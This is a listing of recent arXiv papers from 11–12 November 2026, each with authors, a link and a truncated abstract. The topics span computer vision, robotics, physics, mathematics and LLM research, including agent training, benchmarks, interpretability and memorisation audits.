- **2026-11-12** — Zhenkun Ye, Qian Zhou, Hua Zou — [Description-Guided CLIP Adaptation with Local Evidence Calibration for Few-Shot Plant Disease Recognition](http://arxiv.org/abs/2611.16373v1)
  <details><summary>📄 Abstract</summary>
  Accurate plant disease recognition is essential for intelligent agriculture, but few-shot settings provide limited labeled samples that may not capture diagnostic symptoms and intra-class variations. Pretrained vision-language models (VLMs), such as CLIP, offer transferable visual-semantic knowledge. However, existing CLIP-based methods often rely on coarse class semantics and global visual representations, overlooking disease-specific diagnostic information and fine-grained local cues. Excessiv...
  </details>

- **2026-11-12** — Ruihan Guo, Chaoran Cheng, Zhanghan Ni et al. — [MutAtlas: A PDB-Wide Energy-Guided Atlas of Protein Mutation Effects](http://arxiv.org/abs/2611.16361v1)
  <details><summary>📄 Abstract</summary>
  Protein mutation effect prediction is fundamental to protein engineering and disease variant interpretation, yet experimentally measured mutation data remain accurate but extremely sparse. To provide scalable supplementary mutation signals, we construct a PDB-wide mutation augmentation dataset that exhaustively enumerates single-site substitutions on experimentally resolved protein structures and aligns mutation signals from physics-based energy models, protein language models, and inverse foldi...
  </details>

- **2026-11-12** — Yi-Hsin Hung, Fangfu Liu, Shao-Yuan Lo et al. — [DRAMA: Dissecting Attention Redundancy for Accelerating Multimodal Diffusion Large Language Models](http://arxiv.org/abs/2611.16345v1)
  <details><summary>📄 Abstract</summary>
  Multimodal diffusion large language models (dLLMs) generate text through iterative masked denoising with bidirectional attention, offering a compelling alternative to autoregressive vision-language modeling. However, each denoising step requires a full forward pass over long multimodal sequences in which visual tokens dominate the sequence length, and a fixed step budget further compounds this quadratic per-step cost. Existing inference acceleration approaches for multimodal dLLMs characterize a...
  </details>

- **2026-11-12** — Kia Karbasi, Mahdi Saiedi, Kevin Hong et al. — [Does Deep Knowledge Tracing Learn Semantic Relations Between Knowledge Components?](http://arxiv.org/abs/2611.16323v1)
  <details><summary>📄 Abstract</summary>
  Deep Knowledge Tracing (DKT) is a knowledge tracing (KT) model that updates a shared latent state from sequences of interactions, each pairing a knowledge component (KC) with a response. An interaction with one KC can therefore affect predictions for other KCs. We ask: Are the KC relations learned by DKT semantic? We construct text-derived semantic KC representations using nine pipelines to test whether the conclusions hold across alternative ways of constructing those representations.   The fir...
  </details>

- **2026-11-12** — Sutanshu Saksena Raj, Daksh Maan, Avinash Benki et al. — [Indic-Task Gains and Regressions after Reinforcement Learning](http://arxiv.org/abs/2611.16228v1)
  <details><summary>📄 Abstract</summary>
  We run reinforcement learning (RL) with GRPO across four environments, starting from a supervised fine-tuned 30B-A3B mixture-of-experts model covering English and eight Indic languages. We compare the model before and after RL across 34 benchmarks in one evaluation campaign. MATH improves by 36.07 points, and most Indic benchmarks also improve. Yet XQuAD-Indic F1 falls 19.32 points as English answers rise from 8.7% to 91.7%; IndicQA falls 8.64, while English XQuAD gains 11.71 F1. A second RL run...
  </details>

- **2026-11-12** — Ali Tajfar, Behnam Tajfar — [When can an interpretability claim be trusted? Stability and certification of feature dimensionality, ridge leverage and the feature recovery rate](http://arxiv.org/abs/2611.16190v1)
  <details><summary>📄 Abstract</summary>
  Interpretability tools increasingly support safety claims, such as that a sparse dictionary has recovered most of a model's features. Such claims rest on measurements with arbitrary thresholds, and small changes to the model weights, a different training seed or a different threshold can reverse them. We study two widely used measurements in toy models and synthetic dictionaries with known ground truth: the feature dimensionality of Elhage et al. and the feature recovery rate (FRR) with a cosine...
  </details>

- **2026-11-12** — Cheng-Yu Hsieh, Ting-Yao Hu, Sanjoy Chowdhury et al. — [JudgeMix: Judge-Guided Mixed-Rollout Data Synthesis for LLM Agents](http://arxiv.org/abs/2611.16174v1)
  <details><summary>📄 Abstract</summary>
  Supervised fine-tuning (SFT) on expert trajectories is a standard paradigm for training LLM agents. However, it suffers from a well-known training-inference distribution mismatch, calling for target-aware data synthesis strategies that ground the training data in the target model's native state distribution. To bridge this gap, emerging approaches incorporate the expert either to guide mixed rollouts alongside the target model, or to provide dense step-wise supervision. Nonetheless, existing met...
  </details>

- **2026-11-12** — Zixu Wang, Yu Zhao, Xing Zheng et al. — [Turning Multi-Agent Communication into Token-Level Credit with On Policy Self Distillation](http://arxiv.org/abs/2611.16206v1)
  <details><summary>📄 Abstract</summary>
  Reinforcement learning improves problem solving in large language model multi-agent systems. Existing approaches overlook communication knowledge or compress it into scalar rewards, leaving coarse credit with little guidance on which decisions each agent should reinforce or revise. OPSD4MAS converts future communication into fine-grained token-level credit through On Policy Self Distillation (OPSD). An external model extracts facts and assesses their trajectory relations for coarse-grained filte...
  </details>

- **2026-11-12** — Pengfei Ye, Zhiyang Dou, Yuxiang Ma et al. — [Reins: Frontier Multimodal Models Driving Real Robot Arms on Long-Horizon Tasks, Zero-Shot](http://arxiv.org/abs/2611.16632v1)
  <details><summary>📄 Abstract</summary>
  Frontier models such as GPT-6.1 Sol, GPT-6 Astra and Claude Opus 5.5 can now plan and call tools, yet they still struggle to drive real robots through long-horizon, contact-rich manipulation, blind while the arm moves and while they think. We present Reins, a harness in which an off-the-shelf model operates a dual-arm robot with 3D perception tools and atomic actions that report contact and grip. The model chains actions in one call, each with a condition that must hold, stopping at the first th...
  </details>

- **2026-11-12** — Zhuo Han, Yeqiang Wang, Xinran Wang et al. — [STVLA: Spatial-aware and Temporal-memory forVision-Language-Action Models](http://arxiv.org/abs/2611.16589v1)
  <details><summary>📄 Abstract</summary>
  Robotic manipulation often requires both spatial scene understanding and task history. However, many vision-language-action (VLA) policies rely primarily on current observations, without explicitly integrating spatial structure and task history. Appearance-based memories can be sensitive to occlusion and viewpoint changes, while spatial representations of the current scene alone do not preserve how the scene has changed during task execution. We introduce STVLA, a framework that incorporates fea...
  </details>

- **2026-11-12** — Willem Conradie, Krishna Manoorkar, Alessandra Palmigiano et al. — [The Tiglath Pileser principle and models of persuasion](http://arxiv.org/abs/2611.16459v1)
  <details><summary>📄 Abstract</summary>
  This paper develops a formal framework for analysing how agents extract reliable information from narratives and communicative interactions involving strategic deception. Building on Rubinstein and Glazer's models of persuasion, we introduce Tiglath-Pileser relations, a generalization of codex-based guidance relations, to formalize Baruch Halpern's Tiglath-Pileser principle: despite systematic bias, reported claims must retain a connection to the truth. We analyse these relations set-theoretical...
  </details>

- **2026-11-12** — Haofeng Wang, Pengcheng Wen, Ruiqi Li et al. — [PhysCapBench: A Cross-Domain Benchmark for Physically Grounded Video Captioning](http://arxiv.org/abs/2611.16424v1)
  <details><summary>📄 Abstract</summary>
  Physical AI aims to learn transferable physical knowledge from real-world experience to understand, predict, and act in the physical world. Internet videos and embodied demonstrations provide complementary observations of motion, interaction, and state evolution. A foundational data challenge is to measure and preserve this physical information as training supervision. In video-language pretraining, captions express observed processes in language, yet a semantically correct description can omit ...
  </details>

- **2026-11-12** — Shengjia Zhu, Wenqiang Xu, Lin Shao — [VOKE: Visual Object Kinematics Estimator for Dexterous In-Hand Manipulation](http://arxiv.org/abs/2611.16423v1)
  <details><summary>📄 Abstract</summary>
  Vision-based dexterous in-hand manipulation requires knowing not only where an object is, but also how it moves. However, most robotic manipulation systems rely on off-the-shelf visual perception models whose outputs are limited to static object masks, geometry, or 6D poses, leaving downstream controllers to infer object dynamics implicitly from noisy visual observations. We present VOKE, a kinematics-aware perception framework that augments existing object and hand-object pose estimators to rec...
  </details>

- **2026-11-12** — Chongkai Gao, Jieao Shi, Zhaoyu Mu et al. — [ManiLadder: Benchmarking Robot Manipulation Through a Categorized and Multi-Difficulty Level Task Ladder](http://arxiv.org/abs/2611.16374v1)
  <details><summary>📄 Abstract</summary>
  Recent advances in robotic manipulation have enabled increasingly complex and dexterous behaviors, yet existing benchmarks still focus on simple pick-and-place tasks and lack a systematic framework for measuring progress in robot learning along the axis of task difficulty. We present ManiLadder, a large-scale and organized simulation benchmark for robotic manipulation. ManiLadder contains 112 carefully designed tasks stratified into 4 difficulty levels, with 8 categories in each level, spanning ...
  </details>

- **2026-11-12** — Nikos Salamanos, Paula Gheorghiade, Tom Brughmans et al. — [Theory-Driven Network Backbones for Bipartite Projections](http://arxiv.org/abs/2611.16692v1)
  <details><summary>📄 Abstract</summary>
  Collecting data, including network data, is subject to measurement error. Network backboning is the process of statistically validating each edge in a network to estimate the probability that the edge is born of noisy measurements. The current backboning literature provides approaches in two classes: structural and statistical. The classes differ in many respects, but they share one commonality: the test used to determine whether to filter out noisy edges is data-agnostic; it does not take into ...
  </details>

- **2026-11-12** — Pasquale Di Bari, Xubin Hu — [Extended $SO(10)$-inspired leptogenesis](http://arxiv.org/abs/2611.16604v1)
  <details><summary>📄 Abstract</summary>
  We consider seesaw models with hierarchical Dirac neutrino masses. We show that, barring well known fine-tuned crossing level solutions and given current low energy neutrino experimental data, these always lead to a very hierarchical heavy neutrino spectrum. If the Dirac neutrino masses are assumed not to significantly differ from the up-quark masses, then the intermediate seesaw neutrino ($N_2$) mass falls in the correct range for its decays to explain the matter-antimatter asymmetry of the uni...
  </details>

- **2026-11-12** — Xiaokai Li, Ziyu Zhou, Qibin Cheng et al. — [AI has its own style in mathematical proving](http://arxiv.org/abs/2611.16527v1)
  <details><summary>📄 Abstract</summary>
  As large language models increasingly generate mathematical proofs, whether they develop a proving style distinct from that of human mathematicians remains an open question. This question is particularly pressing as mathematicians increasingly voice concerns that proofs generated by large language models are difficult to interpret. Here we ask three large language models to independently reprove all 465 propositions of Euclid's \textit{Elements} and compare their citation choices against the hum...
  </details>

- **2026-11-12** — Ming Hu, Bei Liu, Bolin Liu et al. — [Weighted STSAFT-Modulation Spaces and Approximation by Phase-Adapted Neural Networks](http://arxiv.org/abs/2611.16448v1)
  <details><summary>📄 Abstract</summary>
  We develop a transform-adapted approximation framework for shallow neural networks based on the short-time special affine Fourier transform (STSAFT). Replacing the short-time Fourier transform (STFT) in the definition of classical modulation spaces, we work with weighted STSAFT-modulation spaces, building on the existing SAFT-associated modulation-space framework, and use their chirp correspondence with classical weighted modulation spaces through the chirp factorization of the SAFT kernel. We c...
  </details>

- **2026-11-12** — Zubair Khalid — [An $O(L^3)$ Spherical Harmonic Transform on $L^2$ Samples](http://arxiv.org/abs/2611.16441v1)
  <details><summary>📄 Abstract</summary>
  For the representation of signals on the sphere band-limited at $L$ using the optimal number of samples, $L^2$, equal to the number of degrees of freedom in harmonic space and placed on $L$ iso-latitude rings, we develop a spherical harmonic transform (SHT) that is theoretically exact, requires no solution of linear systems and no precomputation beyond the placement of the rings, and has complexity $O(L^3)$. The transform rests on the observation that, for each order $m$, the samples on the ring...
  </details>

- **2026-11-12** — Xue Wang, Yubin Xu, Kun Tan — [RICapBench: A Fine-Grained Visual Understanding Benchmark Dataset for Vision-Language Models in Remote Sensing](http://arxiv.org/abs/2611.16413v1)
  <details><summary>📄 Abstract</summary>
  Advances in vision-language models (VLMs) have improved remote sensing image analysis and supported geospatial decision-making. However, fine-grained understanding of remote sensing imagery remains challenging for VLMs. Large variations in object scale, complex geospatial relations among instances, and limited visual detail hinder precise instance localization, visible attribute identification, and spatial relation understanding, potentially leading to descriptions that lack visual grounding. Ex...
  </details>

- **2026-11-12** — Carolina Fortuna, Blaz Bertalanic — [Shared Item-Level Error Limits the Aggregation of Small Language Models in Fermi Estimation](http://arxiv.org/abs/2611.16315v1)
  <details><summary>📄 Abstract</summary>
  Multi-agent systems of language models are often motivated by an averaging argument: if the agents' errors are unbiased and independent, the error of an aggregate of N answers falls as 1/sqrt(N). Fermi estimation, whose continuous answers are aggregated on the logarithmic scale, permits a direct test. We decompose the log10 error of each answer into the mean error of its model on the item, common to all its draws on the item, and a residual, and estimate both from 2.51M answers given before any ...
  </details>

- **2026-11-12** — Miaozhe Lin, Qiongzheng Lin, Zhongwei Liang et al. — [Causals: An Open Knowledge Graph for Research on Causal Reasoning](http://arxiv.org/abs/2611.16267v1)
  <details><summary>📄 Abstract</summary>
  Applying causal knowledge to a new event requires connecting the event to relevant entities and the relationships through which its consequences may unfold. We present Causals, an open knowledge graph for research on this form of reasoning. Its initial release, constructed from news reports, contains 369,184 nodes and 1,272,418 edges linking reported events, organizations, commodities, financial instruments, and other entities. Structural relationships, observations, and attributed causal claims...
  </details>

- **2026-11-12** — Divyanshu Goyal, Gabriel Ruiz, Amir Meisami — [ATune: Unsupervised Photo Retouching Through Image-Editor Controls](http://arxiv.org/abs/2611.16236v1)
  <details><summary>📄 Abstract</summary>
  Photo retouching models are trained on pairs of original and retouched photographs, usually edited by experts. Expert edits are costly, so the two main public sets, FiveK and PPR10K, hold only 16,161 originals. Good photographs on their own are far easier to find: commercial stock collections and free ones such as Pixabay and Unsplash hold millions. We learn retouching from them alone: we damage each photograph the way a camera or a careless edit would, which gives a worse and a better version o...
  </details>

- **2026-11-11** — Taiga Saito, Fabian Campos Montero, Bruno Zuada Coelho et al. — [Subsurface schematisation from sparse CPT data using the tabular foundation model TabPFN](http://arxiv.org/abs/2611.16088v1)
  <details><summary>📄 Abstract</summary>
  Subsurface schematisation supports geotechnical decisions but remains challenging because sparse site-investigation data leave substantial gaps in information about ground conditions. This study explores TabPFN, a foundation model pretrained on general synthetic tabular data, for this task. Using only grid coordinates and soil behaviour type index observations from sparse cone penetration tests (CPTs), we first reconstruct two-dimensional sections without geotechnical fine-tuning or predefined l...
  </details>

- **2026-11-11** — Inigo Stibbe, Joshua Placidi, Padmanabhan Ramnarayan et al. — [Constructing and Validating Memorisation Audits for EHR Foundation Models](http://arxiv.org/abs/2611.15578v1)
  <details><summary>📄 Abstract</summary>
  Autoregressive electronic health record (EHR) foundation models may disclose training information at inference, yet clinical predictability makes patient-specific memorisation difficult to distinguish from generalisation. We evaluate fixed-window token reconstruction, sensitive-attribute disclosure, and random patient-level canaries in GPT-2-style models trained on MIMIC-IV, across early, best-validation, and final checkpoints. Reconstruction improves with additional context, but training--held-...
  </details>

- **2026-11-11** — Jon Kleinberg, Fan Wei — [Characterizing Local Breadth in Language Generation](http://arxiv.org/abs/2611.14887v1)
  <details><summary>📄 Abstract</summary>
  Large language models sharpen the validity--breadth trade-off: a generator should avoid hallucinations without collapsing onto a narrow set of valid outputs. We study generation from positive examples of an unknown target in the Kleinberg--Mullainathan model, with arbitrary, possibly adversarial order and no distributional or computational assumptions. Breadth is measured by lower Banach density, which rules out arbitrarily large sparse holes, unlike prefix-based lower asymptotic density.   1. E...
  </details>

- **2026-11-11** — Jacy Reese Anthis, Ken Burke, David Madras et al. — [Scaling public input on AI policy with pluralistic agents](http://arxiv.org/abs/2611.16028v1)
  <details><summary>📄 Abstract</summary>
  AI is being deployed across a vast range of application domains, cultural environments, and human stakeholders. Safe and responsible AI development requires continuously accounting for diverse perspectives. We develop and test pluralistic agents, AI agent representatives that deliberate on behalf of individuals to align AI systems with diverse human perspectives. Pluralistic agents could help people contribute to many more discussions than they could directly participate in, on technical topics ...
  </details>

- **2026-11-11** — Nikilesh Ramesh, Ross Drummond, Pablo R Baldivieso-Monasterios et al. — [Model Predictive Control on Analogue Hardware: A Dual-flow Approach](http://arxiv.org/abs/2611.15934v1)
  <details><summary>📄 Abstract</summary>
  Current Model Predictive Control (MPC) implementations are predominantly digital and, despite offering high precision and flexibility, often face challenges with ultra-low latency and hardware certification for safety-critical applications. We present an approach for solving the Quadratic Program (QP) of MPC using a continuous-time neural ordinary differential equation in the dual space. We obtain the solution to these QPs by mapping the differential equation's equilibrium point back to the prim...
  </details>

- **2026-11-11** — Lingxiao Kong, Vasileios Arampatzakis, Vasileios Sevetlidis et al. — [HeriKGQA: Grounded Knowledge-Graph Question Answering over Cultural Heritage Sensor Data](http://arxiv.org/abs/2611.15904v1)
  <details><summary>📄 Abstract</summary>
  Cultural heritage sites are increasingly monitored by sensor networks, but querying their data requires database expertise. Large Language Models (LLMs) offer a natural-language interface, yet over raw sensor records they lose track of which sensor, site, and time each value belongs to, and silently miscompute. We present HeriKGQA, a knowledge-graph question-answering method that confines the LLM to interpreting questions and phrasing answers, leaving computation to SPARQL and deterministic code...
  </details>

- **2026-11-11** — David Williams, Michail Kyrkos, Max Hort et al. — [Early Reflections on How Large Language Models are Reshaping Software Engineering Research](http://arxiv.org/abs/2611.15797v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) are radically reshaping software engineering (SE) research. Yet, their steep financial and computational costs raise questions about who participates in that change, and who does not. By analysing all 1,918 papers published in the ICSE 2019-2026 Research and SEIP tracks, we uncover a shifting and highly concentrated research landscape. China and the US dominate LLM-based SE research, appearing in 74% of LLM-based publications between 2023-2026, yet they diverge sharp...
  </details>

- **2026-11-11** — Miao Pan, Kaixiang Yao, Xiaohe Zhou et al. — [Recover, Don't Just Continue: Learning from Feedback for Physical Failure Understanding and Correction](http://arxiv.org/abs/2611.15651v1)
  <details><summary>📄 Abstract</summary>
  Multimodal large language models are regarded as the cognitive foundation of embodied intelligence, but planning from instructions alone cannot make them reliable. During execution, actions deviate from intended effects, constrained by the embodiment and environment. An embodied brain must understand why execution deviates, identify what can be reliably realized, and revise decisions using interaction experience. These correspond to causal failure localization, capability-constrained adaptation,...
  </details>

- **2026-11-11** — Yinghao Hu, Linggang Kong, Qian Xiao et al. — [ChJGBench: A Comprehensive Benchmark for Chinese Legal Judgment Generation with Diagnostic Evaluation](http://arxiv.org/abs/2611.15639v1)
  <details><summary>📄 Abstract</summary>
  With the rapid development of LLMs, increasing attention has been paid to whether they can reliably generate complete and legally valid judicial documents. This calls for a benchmark capable of evaluating whether models can accurately apply statutes and resolve outcome-critical issues, including claims, charges, penalties, and monetary obligations. However, existing benchmarks typically focus on isolated legal tasks or coarse-grained evaluation. We introduce ChJGBench, a benchmark for generating...
  </details>

- **2026-11-11** — Yue Liu, Zhongying Ru, Shimin Di et al. — [Faithful in Steps: Improving Generalization and Citation in RAG via Query Decomposition](http://arxiv.org/abs/2611.15538v1)
  <details><summary>📄 Abstract</summary>
  Retrieval-augment generation is a prevalent strategy to mitigate hallucinations of LLMs. The attributable RAG (RAGQ) generates quotes for its answers. The quotes indicate which input contexts support the RAG to derive the answers, enhancing the answer's verifiability and trustworthiness. However, existing RAGQs exhibit significant degradation when dealing with questions that require multi-hop reasoning and multi-modal understanding, suffering from over-citation, implicit entity identification fa...
  </details>

- **2026-11-11** — Chao-Wei Cai, Min-Te Sun, Sheng Kuang Wu et al. — [One Hierarchy, Many Sports: Hierarchy-Aligned Multi-Task Learning for Next-Shot Prediction](http://arxiv.org/abs/2611.15529v1)
  <details><summary>📄 Abstract</summary>
  Next-shot prediction in racket sports requires learning from event data with different match structures, recorded attributes, and label vocabularies. Table tennis, badminton, and tennis nevertheless share a hierarchy in which shots form rallies and rallies form higher scoring units. We present MT-HTA, a hierarchy-aligned multi-task Transformer that uses this structure to jointly predict the attributes of the next shot. A temporal Transformer captures event progression, a feature-token path model...
  </details>

- **2026-11-11** — Alla Chepurova, Aydar Bulatov, Mikhail Burtsev et al. — [AutoOntic: Automatic Ontology Induction from Text for Knowledge Graph Construction](http://arxiv.org/abs/2611.15467v1)
  <details><summary>📄 Abstract</summary>
  Graph-based retrieval-augmented generation depends on the quality of the knowledge graph (KG) it retrieves over, yet schema-free LLM-based extraction pipelines typically produce flat graphs: deduplicated entities and relations with no type hierarchy and no domain/range constraints. We present AutoOntic, a pipeline that automatically constructs an ontology from text by canonicalizing open-vocabulary entity types and relations, inducing a hierarchy over the canonicalized types, and mining relation...
  </details>

- **2026-11-11** — Haoyu He, Yan Rong, Li Liu — [DeALR: Decoupled Audio-Latent Optimization with Acoustic Backtracking for Test-Time Reasoning](http://arxiv.org/abs/2611.15439v1)
  <details><summary>📄 Abstract</summary>
  Large audio-language models (LALMs) typically encode audio once and conduct subsequent multi-step reasoning in a language-dominated space, weakening access to fine-grained acoustic evidence. Although recent multimodal approaches have explored re-engaging perceptual inputs during reasoning, whether a frozen LALM can actively revisit crucial acoustic evidence in the latent space at test time remains underexplored. To bridge this gap, we introduce Decoupled Audio Latent Reasoning (DeALR), a novel t...
  </details>

- **2026-11-11** — Yaxin Zhang, Xingyu Wu, Yuchen Yan et al. — [SimRec: Learning to Search, Ask, and Recommend from Simulated Interaction](http://arxiv.org/abs/2611.15426v1)
  <details><summary>📄 Abstract</summary>
  LLM-based recommendation agents can search catalogs, inspect products, ask users, and revise rejected recommendations. However, these behaviors are often governed by hand-designed workflows, while existing training methods optimize isolated components such as query rewriting or list ranking rather than the interaction policy as a whole. We present SimRec, a reinforcement learning framework that trains the full interaction policy of a tool-integrated recommendation agent. SimRec introduces two co...
  </details>

- **2026-11-11** — Zhanyu Wu, Richong Zhang — [When Direction Matters: Diagnosing Relational Instruction Following in Dense Retrieval](http://arxiv.org/abs/2611.15417v1)
  <details><summary>📄 Abstract</summary>
  Dense retrievers increasingly claim the ability to condition retrieval on natural-language relevance criteria beyond a short query. We identify a specific weakness in this capability: the evaluated models perform well when lexical or attribute cues distinguish the target, but become much less reliable when relevance depends on a directional relation over the same entities. We introduce SwitchIR, a controlled diagnostic that contrasts Constraint Shift and Explicit Filtering with Relational Flip, ...
  </details>

- **2026-11-11** — Bokai Pan, Ruijie Yang, Mingyue Cheng et al. — [CastWorld: Benchmarking Context-Aware Agentic Time Series Forecasting Beyond Predictive Accuracy](http://arxiv.org/abs/2611.15262v1)
  <details><summary>📄 Abstract</summary>
  Agentic time series forecasting extends conventional approaches beyond one-shot numerical prediction toward autonomous, context-aware interaction. However, existing benchmarks offer limited integrated support for diverse contextual information, forecasting-specific adaptive interactions, and systematic evaluation of forecasting agents. In this paper, we introduce CastWorld, an agentic benchmark for context-aware time series forecasting. First, its context-rich dataset suite spans 8 domains and 2...
  </details>

- **2026-11-11** — Kuang-Ting Huang, Tian-Sheuan Chang — [TQIR: Trellis Quantization with Integer Reconstruction for Bandwidth-Efficient Edge LLM Acceleration](http://arxiv.org/abs/2611.15231v1)
  <details><summary>📄 Abstract</summary>
  Autoregressive large language model (LLM) inference is often limited by external-memory bandwidth, while existing ultra-low-bit trellis quantization reconstructs floating-point weights and leaves runtime Hadamard-transform and decoder costs unresolved. This paper presents TQIR, an algorithm--hardware co-design that decouples storage precision ($S$) from decoded-weight ($W$) and activation ($A$) compute precisions, enabling a better accuracy--hardware trade-off. TQIR performs trellis matching wit...
  </details>

- **2026-11-11** — Yangming Zhang, Siyi Wu, Jian Wang et al. — [MatrixSplat: Matrix-Parallel and Feature-Scalable 3D Gaussian Splatting Rendering on GPUs](http://arxiv.org/abs/2611.15153v1)
  <details><summary>📄 Abstract</summary>
  3D Gaussian Splatting (3DGS) has emerged as a mainstream representation for real-time novel view synthesis and 3D reconstruction. However, existing 3DGS rendering pipelines are poorly aligned with modern GPU architectures: depth-sorted alpha compositing introduces strong per-pixel sequential dependencies, limiting parallelism and resulting in scalar FMA-dominated execution that underutilizes high-throughput matrix units such as Tensor Cores. This mismatch becomes more severe for multimodal and s...
  </details>

- **2026-11-11** — Muhammad Waqas — [Sky Monitor AI: classifying night-sky conditions from an observatory all-sky camera with a CNN ensemble, label-free sky types and exact evidence maps](http://arxiv.org/abs/2611.14987v1)
  <details><summary>📄 Abstract</summary>
  Small and remotely operated observatories must decide every night whether the sky is clear enough to observe. We classify frames of the auxiliary all-sky camera of the Higashi-Hiroshima Observatory as clear or cloudy, using 8806 frames from 32 nights. A circular sky mask removes a printed date stamp that would act as a shortcut, and all evaluations use whole held-out nights. On six test nights, hand-crafted sky statistics reach 77.1% accuracy, a small CNN trained from scratch 84.3%, and a valida...
  </details>

- **2026-11-11** — Hao Jiang, Yujie Yang, Tao Li et al. — [LOHRE: Execution-Grounded Type Recovery via LLM-Orchestrated Hybrid Analysis](http://arxiv.org/abs/2611.14946v1)
  <details><summary>📄 Abstract</summary>
  Documenting stripped binary functions for security analysis requires recovering function interfaces and user-defined type (UDT) layouts from machine code. Existing large language model (LLM)-based methods face two limitations: they lack execution-based validation to detect inferred UDTs inconsistent with actual memory layouts, and may overlook evidence about shared UDTs across functions without direct call relationships. We present LLM-Orchestrated Hybrid Reverse Engineering (LOHRE), a framework...
  </details>

- **2026-11-11** — Milad Gholami, Brendan King, Jeffrey Flanigan — [ToolTurns: Benchmarking LLM Agents in Multi-Turn Dialogue](http://arxiv.org/abs/2611.14925v1)
  <details><summary>📄 Abstract</summary>
  Tool-using language models are increasingly deployed in conversational settings, yet most large-scale tool-use benchmarks focus on isolated requests. We introduce ToolTurns, a benchmark of 2,620 problems spanning 1,827 tools and 11,004 API endpoints across 47 categories. Each dialogue begins with an intentionally underspecified request and continues through two context-dependent follow-ups, testing clarification, tool use, and retention of conversational context. We also introduce an open-source...
  </details>

- **2026-11-11** — Harry Yizhou Tian, Ming Yin — [Understanding the Effects of Multi-Agent Deliberation for Human-AI Decision-Making](http://arxiv.org/abs/2611.14901v1)
  <details><summary>📄 Abstract</summary>
  Multi-agent deliberation (MAD), where multiple LLMs engage in structured discussion, improves AI performance on many benchmarks, but whether it helps humans make better decisions remains untested. We conduct two user studies on LLM-response-verification and fact-checking. We first compare MAD against common AI decision-support methods that isolate its two defining dimensions --- multiple AIs and multi-round interaction. We find MAD outperformed single-round AI assistance on both tasks; multi-rou...
  </details>

- **2026-11-11** — Chuxuan Zhang, Niloofar Jahanshahi, Yasaman Etesam et al. — [Can I join you? Extended Social Force Based Model with Predictive Control and Barrier Functions for Humanoid Group Repositioning Amidst Obstacles](http://arxiv.org/abs/2611.14853v1)
  <details><summary>📄 Abstract</summary>
  As social and service robots increasingly share interaction spaces in public, they may form groups while coordinating tasks or interacting with humans. Initial group formation alone is insufficient in dynamic settings, because it can be disrupted when a person or another agent joins, leaves, or passes through the group. Although group dynamics and repositioning have been widely studied in swarm robotics and virtual-agent settings, little attention has been given to socially appropriate repositio...
  </details>

- **2026-11-11** — Liman Wang, Hanyang Zhong, Sun Zhaole et al. — [DexRemo: A Force-Sensing Hand Platform and Task Suite for Contact-Rich Removal Manipulation](http://arxiv.org/abs/2611.15981v1)
  <details><summary>📄 Abstract</summary>
  Many manipulation tasks require separating adhered, embedded, contaminated, or mechanically constrained targets. We study this setting as removal manipulation, where progress depends on evolving contact states that are only partially observable from vision and kinematics. We introduce DexRemo, a three-finger robotic hand with high-force actuation, modular fingertips, and three-axis fingertip force sensing, together with a nine-scenario real-robot task suite spanning adhesive detachment, surface ...
  </details>

- **2026-11-11** — Kun Chu, Xufeng Zhao, Jan-Gerrit Habekost et al. — [BiPOP: Partial-Order Planning for Long-Horizon Bimanual Robotic Manipulation](http://arxiv.org/abs/2611.15317v1)
  <details><summary>📄 Abstract</summary>
  Bimanual robotic manipulation is versatile, yet its central challenge lies not only in executing dexterous motion with each hand, but also in coordinating the two arms for long-horizon manipulation under coupled spatial and temporal constraints. Prior work has largely focused on endowing robots with human-level manipulation skills, paying less attention to the structure of bimanual behaviour itself: many practical tasks are a coordinated composition of reusable unimanual skills and a small set o...
  </details>

- **2026-11-11** — Abdalmalek Aburaddaha, Zaid A. El Shair, Ali Al-Bustami et al. — [Pothole Risk Assessment with Geometrically Grounded Vision Language Models](http://arxiv.org/abs/2611.16061v1)
  <details><summary>📄 Abstract</summary>
  Potholes impose billions of dollars in annual vehicle damage, yet detectors report only where potholes are, not how severe they are or what to do. Judging severity from a single RGB image is ill-posed, and ungrounded vision-language model (VLM) assessments tend to be over-conservative. We present a five-stage modular framework for the offline assessment of already-detected potholes that combines geometric measurements with VLM reasoning: perspective transformation, zero-shot SAM segmentation, ge...
  </details>

- **2026-11-11** — Niccolò D'Archivio, George Giakkoupis, Frédéric Giroire et al. — [Plurality Consensus for $h$-Majority via First-Repetition Rules](http://arxiv.org/abs/2611.16037v1)
  <details><summary>📄 Abstract</summary>
  In the h-Majority dynamics, each of n agents holds one of k opinions and, in every synchronous round, observes the opinions of h agents chosen independently and uniformly at random and adopts a most frequent one among them, breaking ties uniformly at random. Let M_0 be the initial number of agents holding the most frequent opinion, and Delta_0 its bias, its lead over the second most frequent opinion. We show that, for every sample size h >= 3, if Delta_0 >= L sqrt(M_0 log n) max{1, n/(h^2 M_0)} ...
  </details>

- **2026-11-11** — Jose L. Sampedro Mazon, Ilmi Yoon, Nadim Saad — [What Roles Do System Prompts Really Assign? Validating and Steering Occupational Role Vectors in LLMs](http://arxiv.org/abs/2611.15989v1)
  <details><summary>📄 Abstract</summary>
  Applications built on large language models assign the model a role through its system prompt, intending to shape how it responds for their use case. We introduce a validation framework for extracting and injecting occupational role vectors, activation-level directions that capture how someone in a given occupational role would distinctively respond to a task or question. We validate these vectors through two complementary lenses, on Qwen2.5-7B-Instruct and Llama-3.1-8B-Instruct. The interpretab...
  </details>

- **2026-11-11** — Dennis Davenport, Dewayne A. Dixon, Moussa Doumbia — [Riordan Arrays as Structured Operators for Artificial Intelligence](http://arxiv.org/abs/2611.15954v1)
  <details><summary>📄 Abstract</summary>
  Riordan arrays have traditionally been studied as infinite lower-triangular matrices that encode generating-function transformations and combinatorial relationships. This note proposes a complementary direction: using Riordan arrays as structured operators in artificial intelligence and data analysis. For a data sequence with generating function $A(z)$, a Riordan array $(g(z),f(z))$ produces the transformation \[   A(z)\longmapsto g(z)A(f(z)). \] This yields a parameterized family of causal line...
  </details>

- **2026-11-11** — Alex Haines, Nathanael L. Baisa — [Reinforcement Learning for Inventory Control under Regime-Switching Demand: A Controlled Comparison of LSTM, MLP, and (s,S) Policies](http://arxiv.org/abs/2611.15945v1)
  <details><summary>📄 Abstract</summary>
  Classical inventory policies such as (s,S) are provably optimal under stationary demand but cannot adapt when demand switches between hidden regimes, and memoryless deep reinforcement learning policies, confined to a fixed observation window, cannot maintain a belief over latent demand structure. We ask whether a recurrent policy offers a measurable advantage over both a memoryless policy and a classical baseline under regime-switching demand, and how that advantage scales with supply-chain lead...
  </details>

